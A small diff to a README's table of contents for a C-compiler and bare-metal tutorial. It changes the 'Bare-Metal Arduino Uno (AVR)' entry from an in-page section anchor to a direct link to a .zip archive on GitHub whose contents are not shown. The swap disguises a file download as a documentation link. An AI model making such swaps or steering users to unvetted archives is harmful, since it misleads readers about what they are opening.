@@ -21,7 +21,7 @@
     * [7.2. Makefile Variable Explanation](#72-makefile-variable-explanation)
     * [7.3. Makefile Rule Explained](#73-makefile-rule-explained)
 8.  [The Compiler: `arm-none-eabi-gcc`](#8-the-compiler-arm-none-eabi-gcc)
-9.  [Bare-Metal Arduino Uno (AVR)](#9-case-study-bare-metal-arduino-uno-avr)
+9.  [Bare-Metal Arduino Uno (AVR)](https://github.com/ShravanaHS/understanding-the-c-compiler/blob/main/bare_metal_blink.zip)
     
 
 ## 1. Introduction
